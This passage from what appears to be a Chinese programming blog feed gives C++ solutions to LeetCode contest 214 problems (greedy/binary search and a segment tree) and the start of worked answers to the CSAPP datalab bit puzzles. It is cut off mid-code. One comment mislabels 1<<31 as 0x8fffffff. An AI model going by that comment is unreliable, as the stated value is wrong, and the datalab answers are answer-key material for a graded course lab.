class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">long</span> <span class="keyword">long</span>&gt; freq(n,<span class="number">1</span>);</span><br><span class="line">        sort(A.begin(),A.end());</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = n<span class="number">-1</span>; i &gt;= <span class="number">0</span>; --i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i &gt; <span class="number">0</span> &amp;&amp; A[i] == A[i<span class="number">-1</span>])&#123;</span><br><span class="line">                freq[i<span class="number">-1</span>] += freq[i];</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(i == <span class="number">0</span> || (A[i] - A[i<span class="number">-1</span>])*freq[i] &gt; orders)&#123;</span><br><span class="line">                <span class="keyword">long</span> <span class="keyword">long</span> x = orders/freq[i]; <span class="comment">/*width*/</span></span><br><span class="line">                <span class="keyword">long</span> <span class="keyword">long</span> y = orders%freq[i]; <span class="comment">/*rest*/</span></span><br><span class="line">                ans = (ans + freq[i]*(A[i]+A[i]-x+<span class="number">1</span>)*x/<span class="number">2</span> + y*(A[i]-x))%mod;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                orders -= (A[i] - A[i<span class="number">-1</span>])*freq[i];</span><br><span class="line">                ans = (ans + freq[i]*(A[i] + A[i<span class="number">-1</span>] + <span class="number">1</span>)*(A[i] - A[i<span class="number">-1</span>])/<span class="number">2</span>);</span><br><span class="line">                freq[i<span class="number">-1</span>] += freq[i];</span><br><span class="line">            &#125;    </span><br><span class="line">            <span class="keyword">if</span>(orders &lt;= <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li>二分查找<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxProfit</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; A, <span class="keyword">int</span> orders)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = A.size();</span><br><span class="line">        <span class="keyword">int</span> target = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">long</span> <span class="keyword">long</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">long</span> <span class="keyword">long</span> mod = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line">        sort(A.begin(),A.end());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> l = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> r = <span class="number">1e9</span> + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(l &lt;= r)&#123;</span><br><span class="line">            <span class="keyword">int</span> mid = (l+r)&gt;&gt;<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">long</span> <span class="keyword">long</span> sum = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; A.size(); ++i)&#123;</span><br><span class="line">                sum += max(A[i]-mid,<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(sum &lt;= orders)&#123;</span><br><span class="line">                target = mid;</span><br><span class="line">                r = mid - <span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                l = mid + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = n<span class="number">-1</span>; i &gt;= <span class="number">0</span>; --i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(A[i] &gt; target)&#123;</span><br><span class="line">                <span class="keyword">int</span> delta = A[i] - target;</span><br><span class="line">                ans = (ans + (<span class="keyword">long</span> <span class="keyword">long</span>)(A[i] + target + <span class="number">1</span>)*(A[i]-target)/<span class="number">2</span>)%mod;</span><br><span class="line">                orders -= A[i] - target;      </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        ans = (ans + (<span class="keyword">long</span> <span class="keyword">long</span>)orders*target)%mod;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ul></blockquote><h2 id="5564-通过指令创建有序数组"><a href="#5564-通过指令创建有序数组" class="headerlink" title="5564. 通过指令创建有序数组"></a>5564. 通过指令创建有序数组</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><p>给你一个整数数组 instructions ，你需要根据 instructions 中的元素创建一个有序数组。一开始你有一个空的数组 nums ，你需要 从左到右 遍历 instructions 中的元素，将它们依次插入 nums 数组中。每一次插入操作的 代价 是以下两者的 较小值 ：</p><ul><li><code>nums</code> 中 严格小于  <code>instructions[i]</code> 的数字数目。</li><li><code>nums</code> 中 严格大于  <code>instructions[i]</code> 的数字数目。<br>比方说，如果要将 3 插入到 <code>nums = [1,2,3,5]</code> ，那么插入操作的 代价 为 <code>min(2, 1)</code> (元素 1 和  2 小于 3 ，元素 5 大于 3 ），插入后 nums 变成 <code>[1,2,3,3,5]</code> 。</li></ul><p>请你返回将 <code>instructions</code> 中所有元素依次插入 <code>nums</code>后的 总最小代价 。由于答案会很大，请将它对 <code>109 + 7</code>取余 后返回。</p><p>示例 1：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">输入：instructions = [<span class="number">1</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">2</span>]</span><br><span class="line">输出：<span class="number">1</span></span><br><span class="line">解释：一开始 nums = [] 。</span><br><span class="line">插入 <span class="number">1</span> ，代价为 min(<span class="number">0</span>, <span class="number">0</span>) = <span class="number">0</span> ，现在 nums = [<span class="number">1</span>] 。</span><br><span class="line">插入 <span class="number">5</span> ，代价为 min(<span class="number">1</span>, <span class="number">0</span>) = <span class="number">0</span> ，现在 nums = [<span class="number">1</span>,<span class="number">5</span>] 。</span><br><span class="line">插入 <span class="number">6</span> ，代价为 min(<span class="number">2</span>, <span class="number">0</span>) = <span class="number">0</span> ，现在 nums = [<span class="number">1</span>,<span class="number">5</span>,<span class="number">6</span>] 。</span><br><span class="line">插入 <span class="number">2</span> ，代价为 min(<span class="number">1</span>, <span class="number">2</span>) = <span class="number">1</span> ，现在 nums = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">6</span>] 。</span><br><span class="line">总代价为 <span class="number">0</span> + <span class="number">0</span> + <span class="number">0</span> + <span class="number">1</span> = <span class="number">1</span> 。</span><br></pre></td></tr></table></figure><br>示例 2:<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">输入：instructions = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">4</span>]</span><br><span class="line">输出：<span class="number">3</span></span><br><span class="line">解释：一开始 nums = [] 。</span><br><span class="line">插入 <span class="number">1</span> ，代价为 min(<span class="number">0</span>, <span class="number">0</span>) = <span class="number">0</span> ，现在 nums = [<span class="number">1</span>] 。</span><br><span class="line">插入 <span class="number">2</span> ，代价为 min(<span class="number">1</span>, <span class="number">0</span>) = <span class="number">0</span> ，现在 nums = [<span class="number">1</span>,<span class="number">2</span>] 。</span><br><span class="line">插入 <span class="number">3</span> ，代价为 min(<span class="number">2</span>, <span class="number">0</span>) = <span class="number">0</span> ，现在 nums = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>] 。</span><br><span class="line">插入 <span class="number">6</span> ，代价为 min(<span class="number">3</span>, <span class="number">0</span>) = <span class="number">0</span> ，现在 nums = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">6</span>] 。</span><br><span class="line">插入 <span class="number">5</span> ，代价为 min(<span class="number">3</span>, <span class="number">1</span>) = <span class="number">1</span> ，现在 nums = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">6</span>] 。</span><br><span class="line">插入 <span class="number">4</span> ，代价为 min(<span class="number">3</span>, <span class="number">2</span>) = <span class="number">2</span> ，现在 nums = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>] 。</span><br><span class="line">总代价为 <span class="number">0</span> + <span class="number">0</span> + <span class="number">0</span> + <span class="number">0</span> + <span class="number">1</span> + <span class="number">2</span> = <span class="number">3</span> 。</span><br></pre></td></tr></table></figure><br>示例 3：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">输入：instructions = [<span class="number">1</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>]</span><br><span class="line">输出：<span class="number">4</span></span><br><span class="line">解释：一开始 nums = [] 。</span><br><span class="line">插入 <span class="number">1</span> ，代价为 min(<span class="number">0</span>, <span class="number">0</span>) = <span class="number">0</span> ，现在 nums = [<span class="number">1</span>] 。</span><br><span class="line">插入 <span class="number">3</span> ，代价为 min(<span class="number">1</span>, <span class="number">0</span>) = <span class="number">0</span> ，现在 nums = [<span class="number">1</span>,<span class="number">3</span>] 。</span><br><span class="line">插入 <span class="number">3</span> ，代价为 min(<span class="number">1</span>, <span class="number">0</span>) = <span class="number">0</span> ，现在 nums = [<span class="number">1</span>,<span class="number">3</span>,<span class="number">3</span>] 。</span><br><span class="line">插入 <span class="number">3</span> ，代价为 min(<span class="number">1</span>, <span class="number">0</span>) = <span class="number">0</span> ，现在 nums = [<span class="number">1</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">3</span>] 。</span><br><span class="line">插入 <span class="number">2</span> ，代价为 min(<span class="number">1</span>, <span class="number">3</span>) = <span class="number">1</span> ，现在 nums = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">3</span>] 。</span><br><span class="line">插入 <span class="number">4</span> ，代价为 min(<span class="number">5</span>, <span class="number">0</span>) = <span class="number">0</span> ，现在 nums = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">4</span>] 。</span><br><span class="line">​​​​​插入 <span class="number">2</span> ，代价为 min(<span class="number">1</span>, <span class="number">4</span>) = <span class="number">1</span> ，现在 nums = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">4</span>] 。</span><br><span class="line">插入 <span class="number">1</span> ，代价为 min(<span class="number">0</span>, <span class="number">6</span>) = <span class="number">0</span> ，现在 nums = [<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">4</span>] 。</span><br><span class="line">插入 <span class="number">2</span> ，代价为 min(<span class="number">2</span>, <span class="number">4</span>) = <span class="number">2</span> ，现在 nums = [<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">4</span>] 。</span><br><span class="line">总代价为 <span class="number">0</span> + <span class="number">0</span> + <span class="number">0</span> + <span class="number">0</span> + <span class="number">1</span> + <span class="number">0</span> + <span class="number">1</span> + <span class="number">0</span> + <span class="number">2</span> = <span class="number">4</span> 。</span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>1 &lt;= instructions.length &lt;= 105</code></li><li><code>1 &lt;= instructions[i] &lt;= 105</code></li></ul><h3 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/create-sorted-array-through-instructions" target="_blank" rel="noopener">https://leetcode-cn.com/problems/create-sorted-array-through-instructions</a></p><h3 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 线段树或者平衡树</p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><ol><li>由于题目中的数目最大值为<code>1e5</code>，所以如果熟悉线段树的同学一看就知道本题可以用线段树进行题解，时间复杂度约为$O(n\lg{max(A[i])})$.</li><li>每次我们更新<code>freq[instructions[i]]</code>进行加一操作即可，每次我们统计线段树区间<code>[0,instructions[i]-1]</code>的和即为严格小于<code>instructions[i]</code>的数目，统计<code>[instructions[i]+1,1e5]</code>的和即为严格大于<code>instructions[i]</code>的数目，我们很快就能求出代价，典型的线段树的模板，非常简单。<h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MAXN = <span class="number">1e5</span> + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MOD = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ls(root) (root&lt;&lt;1)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> rs(root) (root&lt;&lt;1|1)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">SegTreeNode</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> l;</span><br><span class="line">    <span class="keyword">int</span> r;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> sum;</span><br><span class="line">&#125;;</span><br><span class="line">SegTreeNode tree[MAXN&lt;&lt;<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">buildTree</span><span class="params">(<span class="keyword">int</span> root,<span class="keyword">int</span> l,<span class="keyword">int</span> r)</span></span>&#123;</span><br><span class="line">    tree[root].l = l;</span><br><span class="line">    tree[root].r = r;</span><br><span class="line">    tree[root].sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(l == r) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">int</span> mid = (l+r)&gt;&gt;<span class="number">1</span>;</span><br><span class="line">    buildTree(ls(root),l,mid);</span><br><span class="line">    buildTree(rs(root),mid+<span class="number">1</span>,r);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">pushupTree</span><span class="params">(<span class="keyword">int</span> root)</span></span>&#123;</span><br><span class="line">    tree[root].sum = (tree[ls(root)].sum + tree[rs(root)].sum)%MOD;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">updateTree</span><span class="params">(<span class="keyword">int</span> root,<span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">long</span> <span class="keyword">long</span> val)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(l == tree[root].l &amp;&amp; r == tree[root].r)&#123;</span><br><span class="line">        tree[root].sum = (tree[root].sum + val*(r-l+<span class="number">1</span>))%MOD;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> mid = (tree[root].l + tree[root].r)&gt;&gt;<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(r &lt;= mid)&#123;</span><br><span class="line">        updateTree(ls(root),l,r,val);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(l &gt; mid)&#123;</span><br><span class="line">        updateTree(rs(root),l,r,val);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        updateTree(ls(root),l,mid,val);</span><br><span class="line">        updateTree(rs(root),mid+<span class="number">1</span>,r,val);</span><br><span class="line">    &#125;</span><br><span class="line">    pushupTree(root);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="keyword">long</span> <span class="title">queryTree</span><span class="params">(<span class="keyword">int</span> root,<span class="keyword">int</span> l,<span class="keyword">int</span> r)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(l == tree[root].l &amp;&amp; r == tree[root].r)&#123;</span><br><span class="line">        <span class="keyword">return</span> tree[root].sum;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> mid = (tree[root].l + tree[root].r)&gt;&gt;<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(r &lt;= mid)&#123;</span><br><span class="line">        <span class="keyword">return</span> queryTree(ls(root),l,r);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(l &gt; mid)&#123;</span><br><span class="line">        <span class="keyword">return</span> queryTree(rs(root),l,r);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (queryTree(ls(root),l,mid) + queryTree(rs(root),mid+<span class="number">1</span>,r))%MOD;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">createSortedArray</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; instructions)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = instructions.size();</span><br><span class="line">        <span class="keyword">long</span> <span class="keyword">long</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">long</span> <span class="keyword">long</span> mod = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line">        buildTree(<span class="number">1</span>,<span class="number">0</span>,<span class="number">1e5</span>+<span class="number">1</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> v : instructions)&#123;</span><br><span class="line">            <span class="keyword">long</span> <span class="keyword">long</span> curr = min(queryTree(<span class="number">1</span>,<span class="number">0</span>,v<span class="number">-1</span>),queryTree(<span class="number">1</span>,v+<span class="number">1</span>,<span class="number">1e5</span>+<span class="number">1</span>));</span><br><span class="line">            ans = (ans + curr)%mod;</span><br><span class="line">            updateTree(<span class="number">1</span>,v,v,<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;leetcode-contest-214&quot;&gt;&lt;a href=&quot;#leetcode-contest-214&quot; class=&quot;headerlink&quot; title=&quot;leetcode contest 214&quot;&gt;&lt;/a&gt;leetcode contest 214&lt;/h1&gt;&lt;p&gt;本周周赛的题目比较简单，最后一题竟然是典型的线段树的模板题目，没啥意思，直接&lt;code&gt;copy&lt;/code&gt;模板搞定。第三题还稍微有那么点意思，本周最难的题目是第三题。上午做饭，忙家务，只能参加虚拟竞赛了。&lt;br&gt;&lt;img src=&quot;https://i.loli.net/2020/11/08/VKdlHCTfcqI2ygE.png&quot; alt=&quot;1&quot;&gt;&lt;/p&gt;&lt;h2 id=&quot;5561-获取生成数组中的最大值&quot;&gt;&lt;a href=&quot;#5561-获取生成数组中的最大值&quot; class=&quot;headerlink&quot; title=&quot;5561. 获取生成数组中的最大值&quot;&gt;&lt;/a&gt;5561. 获取生成数组中的最大值&lt;/h2&gt;&lt;h3 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h3&gt;&lt;p&gt;给你一个整数 n 。按下述规则生成一个长度为 &lt;code&gt;n + 1&lt;/code&gt; 的数组 &lt;code&gt;nums&lt;/code&gt; ：&lt;/p&gt;
    
    </summary>
    
    
      <category term="算法" scheme="http://yoursite.com/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="leetcode" scheme="http://yoursite.com/tags/leetcode/"/>
    
  </entry>
  
  <entry>
    <title>【CSAPP】 Lab1</title>
    <link href="http://yoursite.com/2020/11/08/221/"/>
    <id>http://yoursite.com/2020/11/08/221/</id>
    <published>2020-11-07T16:17:11.223Z</published>
    <updated>2020-11-07T16:17:16.398Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CSAPP-lab1-datalab"><a href="#CSAPP-lab1-datalab" class="headerlink" title="CSAPP lab1 datalab"></a>CSAPP lab1 datalab</h1><p>从上周开始做<code>csapp</code>的<code>data lab</code>相关project，<code>csapp</code>的<code>project</code>非常难的，还是非常有意思的题目。感觉<code>lab1</code>中每个题目都像是智力题，感觉还是太难了，过于刁钻的题目，但是对这些题目摸透了，将会对数位的操作非常熟悉。题目中不光限制使用的操作符，并且限制了使用操作符的此时，所以还是非常考验智商的题目,题目做的很痛苦。</p><a id="more"></a><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><ol><li>利用与、非构建成异或，我们直到可以利用基本的公式即可。<figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">x</span>^<span class="symbol">y</span> = ~((~(<span class="symbol">x</span>&amp;(~<span class="symbol">y</span>)))&amp;(~((~<span class="symbol">x</span>)&amp;<span class="symbol">y</span>)))</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1</span></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * bitXor - x^y using only ~ and &amp; </span></span><br><span class="line"><span class="comment"> *   Example: bitXor(4, 5) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ &amp;</span></span><br><span class="line"><span class="comment"> *   Max ops: 14</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bitXor</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ~((~(x&amp;(~y)))&amp;(~((~x)&amp;y)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>求出最小的整数，这个最基本的即可。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * tmin - return minimum two's complement integer </span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 4</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">tmin</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>&lt;&lt;<span class="number">31</span>; <span class="comment">// 0x8fffffff</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>这个就稍微难了点,直接参考网上的答案</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * isTmax - returns 1 if x is the maximum, two's complement number,</span></span><br><span class="line"><span class="comment"> *     and 0 otherwise </span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | +</span></span><br><span class="line"><span class="comment"> *   Max ops: 10</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isTmax</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (!(x+<span class="number">1</span>+x+<span class="number">1</span>))&amp;(!!(x+<span class="number">1</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>测试奇数位是否全为<code>1</code>,构造偶数位全为<code>1</code>的掩码与原数进行或即可。<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * allOddBits - return 1 if all odd-numbered bits in word set to 1</span></span><br><span class="line"><span class="comment"> *   where bits are numbered from 0 (least significant) to 31 (most significant)</span></span><br><span class="line"><span class="comment"> *   Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 12</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span 